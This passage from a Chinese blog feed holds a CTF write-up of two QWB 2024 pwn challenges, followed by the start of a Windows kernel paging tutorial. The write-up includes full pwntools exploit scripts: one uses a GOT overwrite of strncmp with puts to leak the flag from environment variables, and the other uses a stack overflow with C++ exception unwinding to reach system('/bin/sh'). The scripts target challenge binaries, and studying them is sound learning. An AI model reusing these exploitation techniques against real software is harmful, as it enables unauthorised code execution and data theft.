class="line">      name_start = (((<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) name)[<span class="number">0</span>]</span><br><span class="line">    | (((<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) name)[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      len -= <span class="number">2</span>;</span><br><span class="line">      name += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (ep = __environ; *ep != <span class="literal">NULL</span>; ++ep)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _STRING_ARCH_unaligned</span></span><br><span class="line">  <span class="type">uint16_t</span> ep_start = *(<span class="type">uint16_t</span> *) *ep;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">uint16_t</span> ep_start = (((<span class="type">unsigned</span> <span class="type">char</span> *) *ep)[<span class="number">0</span>]</span><br><span class="line">       | (((<span class="type">unsigned</span> <span class="type">char</span> *) *ep)[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (name_start == ep_start &amp;&amp; !<span class="built_in">strncmp</span> (*ep + <span class="number">2</span>, name, len)</span><br><span class="line">      &amp;&amp; (*ep)[len + <span class="number">2</span>] == <span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> &amp;(*ep)[len + <span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察到最后一个循环中，它在遍历环境变量，并且使用 strncmp 这个函数，而这个函数恰好是在 got 表中的，如果尝试将其改为 puts，结果会如何呢？</p><img src="/2024/11/07/qwb2024_pre/10.png" class=""><p>可以发现只输出了 USER 环境变量，而且前两位被去掉了，我们从头来分析这个源码看。因为我们入口是 <code>getenv(&quot;USER&quot;)</code>，所以长度为 1 的判断就直接过掉，直接看 else 分支，似乎只有开头两个字符匹配到了，才会紧接着调用 strncmp，因此出现了只输出 USER 环境变量的问题。</p><p>但是当我选择选项 2 或 3 的时候，它输出了所有的环境变量</p><img src="/2024/11/07/qwb2024_pre/11.png" class=""><p>也就是说不管是调用 putenv 还是 setenv，在劫持了 strncmp 函数之后都可以完美输出所有环境变量。</p><p>它们两个函数内部都调用了一个函数 <code>__add_to_environ</code>。</p><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/stdlib/setenv.c#L116">函数源码跳楼</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__add_to_environ (<span class="type">const</span> <span class="type">char</span> *name, <span class="type">const</span> <span class="type">char</span> *value, <span class="type">const</span> <span class="type">char</span> *combined,</span><br><span class="line">  <span class="type">int</span> replace)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> **ep;</span><br><span class="line">  <span class="type">size_t</span> size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute lengths before locking, so that the critical section is</span></span><br><span class="line"><span class="comment">     less of a performance bottleneck.  VALLEN is needed only if</span></span><br><span class="line"><span class="comment">     COMBINED is null (unfortunately GCC is not smart enough to deduce</span></span><br><span class="line"><span class="comment">     this; see the #pragma at the start of this file).  Testing</span></span><br><span class="line"><span class="comment">     COMBINED instead of VALUE causes setenv (..., NULL, ...)  to dump</span></span><br><span class="line"><span class="comment">     core now instead of corrupting memory later.  */</span></span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> namelen = <span class="built_in">strlen</span> (name);</span><br><span class="line">  <span class="type">size_t</span> vallen;</span><br><span class="line">  <span class="keyword">if</span> (combined == <span class="literal">NULL</span>)</span><br><span class="line">    vallen = <span class="built_in">strlen</span> (value) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  LOCK;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We have to get the pointer now that we have the lock and not earlier</span></span><br><span class="line"><span class="comment">     since another thread might have created a new environment.  */</span></span><br><span class="line">  ep = __environ;</span><br><span class="line"></span><br><span class="line">  size = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (ep != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> (; *ep != <span class="literal">NULL</span>; ++ep)</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strncmp</span> (*ep, name, namelen) &amp;&amp; (*ep)[namelen] == <span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  ++size;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">中间省略很多代码，感兴趣可以直接去看完整源码</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过分析这个函数的源码，可以发现这里会无条件地去遍历环境变量一次一次调用 strncmp 去判断，并且很幸运，第一个参数就是函数变量的指针，因此修改 strncmp 的 got 为 puts 函数，就可以输出所有的环境变量。</p><p>在远程环境中， flag 就在环境变量中。</p><p>总EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;47.94.231.2&#x27;,)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">ch</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;delete:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, payload</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;edit:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;show:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">env</span>(<span class="params">ch</span>):</span><br><span class="line">    choice(<span class="number">5</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;sad !&#x27;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">addr1,payload</span>):</span><br><span class="line">    choice(<span class="number">6</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;addr&#x27;</span>,p64(addr1))</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x21ace0</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">write(libc_addr+<span class="number">0x21a118</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">env(<span class="number">2</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><p>第二种方法当然是可以用 Largebin Attack 去打，但是过于复杂，可能自己还没学会，主要在于分享自己的 EXP 和做题思路了，就不增加额外的工作量。</p><h2 id="expect-number"><a href="#expect-number" class="headerlink" title="expect_number"></a>expect_number</h2><p><a href="expect_number_cf786f84f8b86260b7eac1628ad682a8.zip">附件下载</a></p><p>这题没给 libc，应该题目自己有提权或者是给 flag 的东西，运行它输出的话，需要让我们最终计算得到 <code>0x4F5DA2</code> 这个值。</p><p>也是一个很经典的菜单</p><img src="/2024/11/07/qwb2024_pre/12.png" class=""><p>选项 1 发现它会根据随机 <code>1~4</code> 之间的整数来判断当前对数字做四则运算，1、2、3、4 分别对应了加、减、乘、除，并且另一个运算的数字只能是 0 1 2。既然是随机，那么交叉一下 srand 函数看看它是用了什么种子。</p><img src="/2024/11/07/qwb2024_pre/13.png" class=""><p>虽然调用了 time 函数，但是使用了 1 作为种子，因此序列是固定的，可以自己也编写一个 C 语言程序去输出这个序列。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    srand(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">288</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,rand()%<span class="number">4</span>+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了避免被怀疑水长度，这里 288 个数字不展示了，仅在最后 EXP 展示。</p><p>很显然的，加减如果是 0，那么这次加减是无效的，乘除如果是 1，这次乘除也是无效的，来先看看指定数值的判断逻辑。</p><img src="/2024/11/07/qwb2024_pre/14.png" class=""><p>它只判断最后的那一个字节是否为 a8，自己构造序列也挺简单，遇到除法就给 1，遇到减法就给 0，结果发现再一次加法中突然报错了。</p><p>顺着报错找到代码</p><img src="/2024/11/07/qwb2024_pre/15.png" class=""><p>看了一下可能我的数值不超过 0x100，但是发现 &gt;0x80 的数被识别为了负数，前面将char类型做了符号扩展之后又转为无符号整数，自然就超出范围了。</p><p>这里举个例子构造 0x82，再次尝试加法的时候结果为 0x80于是进入里面的逻辑</p><img src="/2024/11/07/qwb2024_pre/16.png" class=""><p>可以发现它先做了零扩展（movzx），再做了符号扩展（movsx），因此下一步 RAX 的值变为了 <code>0xffffff80</code>，对于res来说，它是 -80 了，再+2变为 -78，转为无符号整数之后自然就超过了 0x100</p><img src="/2024/11/07/qwb2024_pre/17.png" class=""><p>因此如果想算出超过 0x80 的字节，必须算到对应的 &#x2F;2 的形式，而且最后一个运算符必须是 <code>*2</code>，结果只能是偶数，不能结果不能超过一个字节。</p><p>这些结论做稍加的数学推导应该很容易发现，但是当你好不容易凑好 0x54，再乘 2 得到 0xa8 的时候，会发现，远程 gift 是没有这个文件的。</p><img src="/2024/11/07/qwb2024_pre/18.png" class=""><p>咨询出题人（合理的咨询是不违反比赛规则的）后发现这是正常情况</p><img src="/2024/11/07/qwb2024_pre/19.png" class=""><p>那么题目就不是让我们执行这个 <code>system(&quot;cat gift&quot;)</code> 了，闲来无事去找字符串的时候发现 <code>/bin/sh</code>，发现在输入选项的时候有一个后门。</p><img src="/2024/11/07/qwb2024_pre/20.png" class=""><p>发现 cin 被 try 包裹了，如果出现运行时错误，那么就执行 <code>system(&quot;/bin/sh&quot;)</code>，而试过了各种输入都无法触发，一再陷入僵局，后面发现了退出函数有一个函数指针的调用。</p><img src="/2024/11/07/qwb2024_pre/21.png" class=""><p>正常情况下就是输出 <code>Good Bye</code>，于是想到能否将结果覆盖到上面，计算的数值的结构体是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">calc</span>&#123;</span></span><br><span class="line"><span class="type">char</span> *unknown;</span><br><span class="line"><span class="type">int</span> rounds;</span><br><span class="line"><span class="type">char</span> num[<span class="number">288</span>];</span><br><span class="line"><span class="type">char</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而我们的数值是随着 round 增加保存在后面的，查看是否有机会覆盖函数指针，结构体地址在 <code>5400</code>，而函数指针在 <code>5520</code>，显然我们足以覆盖这个函数指针。</p><img src="/2024/11/07/qwb2024_pre/22.png" class=""><p>具体字段图中标出，我们有机会覆盖任意字节到函数指针的低位。</p><p>于是找各种可能的情况，在 4c00 的地址 0x100 字节范围内看看有什么能修改的。</p><img src="/2024/11/07/qwb2024_pre/23.png" class=""><p>这里大概率都是虚函数表，发现 0x60 偏移处有一个栈溢出，栈溢出刚好足以让我们覆盖返回地址。</p><img src="/2024/11/07/qwb2024_pre/24.png" class=""><p>同时发现它主动检测溢出了会抛出运行时异常，运行时异常 emm，是不是可以和前面结合一下呢，答案是可以的，我们来了解一下C++如何处理异常的。我们都知道，在严格的异常处理流程，一个函数如果有可能抛出异常，要么你声明它本身也是可以抛出异常，要么将可能抛出异常的函数用 try 包裹。</p><p>C++ 如何实现多级的 try 判断呢，答案是栈回溯，它会寻找调用栈，判断之前的函数有没有被 try 包裹，有的话尝试捕获去处理。正常情况下这种设计当然没问题，如果返回值地址被我们修改的话，它就会根据返回值地址的值去寻找调用栈，那么此时我就可以尝试将这个抛出的异常在 cin 输入那里去捕获，然后完成 <code>system(&quot;/bin/sh&quot;)</code> 的调用。</p><p>并且 show 功能可以输出程序基地址，也不用去爆破了。</p><p>最后一点需要注意的是，看到后门这里，它有一条写栈内存的指令，因此在溢出的时候，RBP 要设为一个可写的地址。</p><p>最终 EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./expect_number&#x27;</span>,aslr=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;39.106.48.123&#x27;,32818)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">seq=<span class="string">&quot;4 3 2 4 2 4 3 1 2 2 3 4 3 4 4 3 1 3 1 1 4 1 4 2 3 3 3 4 4 4 2 3 3 3 2 4 2 1 4 3 2 2 2 4 1 2 3 1 4 3 2 3 4 1 1 2 3 3 1 2 2 2 1 4 1 2 3 2 2 2 1 4 3 2 3 4 3 1 4 3 4 1 1 3 1 1 4 4 3 4 1 1 1 1 4 1 3 3 3 4 4 3 3 3 4 2 2 3 2 1 1 1 2 1 3 2 2 2 1 4 1 2 4 2 2 4 2 4 2 4 4 1 2 2 3 2 3 4 4 1 1 4 1 2 4 4 3 1 1 4 1 2 1 4 3 2 3 4 2 4 4 1 1 1 2 3 2 1 3 1 1 3 4 1 4 4 4 2 4 1 1 4 2 1 4 4 3 2 3 4 2 2 4 2 3 1 4 4 1 2 1 1 4 4 2 3 3 1 1 3 1 1 2 2 2 1 1 4 3 4 3 4 1 2 1 3 2 4 3 3 2 3 3 1 2 4 4 1 1 4 3 1 4 4 3 1 1 3 4 3 2 2 2 3 3 2 1 1 1 3 3 2 1 1 3 3 1 2 3 1 1 1 1 4 4 3 1 4 2 4 2 3 2 3 1 4 4 2&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">seqnum=[<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> seq]</span><br><span class="line">target=<span class="number">0x60</span></span><br><span class="line"></span><br><span class="line">now=<span class="number">0</span></span><br><span class="line">ch=<span class="number">0</span></span><br><span class="line">k=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> seqnum:</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">1</span>:</span><br><span class="line">        k += <span class="string">&#x27;2&#x27;</span></span><br><span class="line">        now += <span class="number">2</span></span><br><span class="line">        <span class="comment"># if now == target-2:</span></span><br><span class="line">        <span class="comment">#     gdb.attach(p)</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;or 0&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">elif</span> i==<span class="number">2</span>:</span><br><span class="line">        k += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;or 0&#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        k += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;or 0&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    ch+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> now==target:<span class="keyword">break</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> seqnum[ch:-<span class="number">0xc</span>]:</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">1</span> <span class="keyword">or</span> i==<span class="number">2</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;or 0&#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">        k += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;or 0&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">        k += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="comment"># input()</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(k)</span><br><span class="line">addr=u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x4c60</span></span><br><span class="line">success(<span class="string">&#x27;code: &#x27;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x20</span>+p64(addr+<span class="number">0x5080</span>)+p64(addr+<span class="number">0x251A</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;Tell me your favorite number.&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>本地运行结果</p><img src="/2024/11/07/qwb2024_pre/25.png" class=""><p>远程运行结果（纪念一下hh）</p><img src="/2024/11/07/qwb2024_pre/26.png" class=""><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>能打出两题还是挺开心的，感谢强网杯提供的高质量赛题（就是rs和go没学过后面就坐牢了），不管是从考点还是利用难度来说，题目出的都是非常棒的。</p>]]></content>
    
    
    <summary type="html">本次强网杯初赛做出两道pwn题，把详细题解写一下记录。</summary>
    
    
    
    <category term="比赛复盘" scheme="https://xia0ji233.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/"/>
    
    <category term="强网杯S8初赛" scheme="https://xia0ji233.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/%E5%BC%BA%E7%BD%91%E6%9D%AFS8%E5%88%9D%E8%B5%9B/"/>
    
    <category term="Pwn" scheme="https://xia0ji233.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/%E5%BC%BA%E7%BD%91%E6%9D%AFS8%E5%88%9D%E8%B5%9B/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>windows内核（1）——分页</title>
    <link href="https://xia0ji233.github.io/2024/11/07/WindowsKernel1/"/>
    <id>https://xia0ji233.github.io/2024/11/07/WindowsKernel1/</id>
    <published>2024-11-07T05:00:00.000Z</published>
    <updated>2025-01-17T10:46:28.491Z</updated>
    
    <content type="html"><![CDATA[<p>今天开始正式学习分页的相关知识</p><span id="more"></span><h2 id="分页与物理地址"><a href="#分页与物理地址" class="headerlink" title="分页与物理地址"></a>分页与物理地址</h2><h3 id="什么是物理地址"><a href="#什么是物理地址" class="headerlink" title="什么是物理地址"></a>什么是物理地址</h3><p>在学习二进制的时候就有区分过物理地址和虚拟地址这两个概念，其实就是内存条真正的地址，这里不再赘述。而学习保护模式我们知道，实际的线性地址 &#x3D; 逻辑地址+段寄存器.base，在汇编和C指针层面所使用的地址都是逻辑地址。但是似乎它等同于虚拟地址（线性地址），这是因为通常情况下段寄存器的 base 都为 0。</p><h3 id="10-10-12分页详解"><a href="#10-10-12分页详解" class="headerlink" title="10-10-12分页详解"></a>10-10-12分页详解</h3><h4 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h4><p>拿到一个32位的地址，将其结构进行拆分</p><img src="/2024/11/07/WindowsKernel1/1.png" class=""><p>这就是 10-10-12 分页的命名由来，而去寻找对应的物理页也是根据每个进程的 Cr3 寄存器的值去找到，整体分页结构如下图所示</p><img src="/2024/11/07/WindowsKernel1/2.png" class=""><p>同时我们也可以看到，不同的虚拟页是可以映射同一个物理页的，下面来介绍一下 PDE 和 PTE 的基本结构。</p><h4 id="物理页的属性"><a href="#物理页的属性" class="headerlink" title="物理页的属性"></a>物理页的属性</h4><img src="/2024/11/07/WindowsKernel1/3.png" class=""><p>下面描述一下各个位的作用：</p><ul><li>P 位：表示<code>PDE</code>或者<code>PTE</code>是否有效，如果有效为<code>1</code>，反之为<code>0</code>。</li><li>R&#x2F;W 位：如果<code>R/W = 0</code>，表示是只读的，反之为可读可写。</li><li>U&#x2F;S 位：如果<code>U/S = 0</code>，则为特权用户（super user），即非3环权限。反之，则为普通用户，即为3环权限。</li><li>PS位：这个位只对<code>PDE</code>有意义。如果<code>PS == 1</code>，则<code>PDE</code>直接指向物理页，不再指向<code>PTE</code>，低22位是页内偏移。它的大小为<code>4MB</code>，俗称“大页”。</li><li>A 位：是否被访问，即是否被读或者写过，如果被访问过则置<code>1</code>。</li><li>D 位：脏位，指示是否被写过。若没有被写过为<code>0</code>，被写过为<code>1</code>。</li><li>G 位：表示是否为全局页。它的作用是什么呢？举个例子，操作系统的进程的高<code>2G</code>映射基本不变，如果<code>Cr3</code>改了，<code>TLB</code>刷新重建高<code>2G</code>以上很浪费。所以<code>PDE</code>和<code>PTE</code>中有个<code>G</code>位，如果为1，刷新<code>TLB</code>时将不会刷新它指向的页。</li><li>PWT 位：当<code>PWT = 1</code>，写缓存的时候也要将数据写入内存中。</li><li>PCD 位：当<code>PCD = 1</code>时，禁止某个页写入缓存，直接写内存。比如，做页表用的页，已经存储在TLB中了，可能不需要再缓存了。</li></ul><p>需要注意的是</p><ul><li><code>PTE</code> 可以没有物理页，且只能对应一个物理页。</li><li>多个<code>PTE</code>也可以指向同一个物理页。</li><li><code>PDE</code>和<code>PTE</code>重合的属性共同决定着最终物理页的属性。比如 P 位，如果有一个是 0，那么最终的物理页就是无效的。但是<code>PDE</code>和<code>PTE</code>它们的属性的影响范围是不一样的。数值上：物理页的属性 &#x3D; PDE属性 &amp; PTE属性。</li></ul><h2 id="地址翻译"><a href="#地址翻译" class="headerlink" title="地址翻译"></a>地址翻译</h2><p>对于一个给定的线性地址，比如我们执行<code>mov eax,ds:[0x12345678]</code>这句汇编指令的时候，<code>0x12345678</code>这个线性地址会传递给<code>CPU</code>，先查询<strong>TLB</strong>（页表缓存）和<strong>缓存</strong>有没有，有的话直接取出来返回；如果没有，经过 MMU（Memory Management Unit，内存管理单元）处理得到物理地址，通过固定的分页模式直接找到，取出数据返回。</p><p>TLB大概就是一张表，根据线性地址和 CR3 的值去找物理页地址，如果命中，MMU将可以快速完成翻译。如果 TLB 没有对应的项，则往后会查页表的缓存，查到了也会快速返回，否则只能够去一次一次访存查询页表（这里具体的过程还没有特别弄懂，mark一下，写了新的回来补）。</p><img src="/2024/11/07/WindowsKernel1/4.png" class=""><p>上面我们经历了一遍翻译的过程，具体我们需要给入几个参数：页表基址（物理地址），线性地址，数据，寄存器，读写信号，这也就解释了为什么 CPU 不允许直接交换两个位置的内存，如果允许则这方面处理将比较麻烦，何况并不是说不提供交换内存的指令就无法实现一些功能。</p><h3 id="页表学习准备"><a href="#页表学习准备" class="headerlink" title="页表学习准备"></a>页表学习准备</h3><p>笔者用的系统是 Win7 32 位的，虽然现在 32 位的系统几乎用的很少了，但是为了系统的学习还是从简单的开始。Win7 32 默认是 2-9-9-12 分页，先用几个指令配置为更简单的 10-10-12 分页。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /set pae ForceDisable  